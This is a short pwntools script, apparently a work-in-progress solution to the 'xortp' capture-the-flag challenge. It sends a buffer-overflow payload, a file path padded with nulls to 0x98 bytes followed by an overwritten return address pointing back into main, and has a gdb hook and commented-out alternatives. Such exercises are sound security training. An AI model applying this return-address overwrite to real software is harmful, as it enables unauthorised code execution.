from pwn import *

PATH = "./src/xortp"
REMOTE = "chall.fcsc.fr"
PORT = 2105
context.binary = elf = ELF(PATH)
context.log_level = "debug"

r = process(PATH)
# r = remote(REMOTE, PORT)

gdb.attach(r, gdbscript="""
                        add-symbol-file ./src/xortp
                        set disable-randomization off
                        c
                        """)

path_pl = b"./src/flag.txt"
# path_pl = b"/dev/urandom"
# path_pl = b"./src/xortp"
# path_pl = b"flag.txt"

target = p64(elf.symbols["main"] + 1)


payload = path_pl + b"\x00" * (0x98 - len(path_pl)) + target

r.recvuntil("encrypt?\n")
r.sendline(payload)
# r.sendline("\x00" * 128)
print(len(bytes.fromhex(r.recvline().decode())))
r.recvuntil("encrypt?\n")
r.sendline(payload)
print(len(bytes.fromhex(r.recvline().decode())))

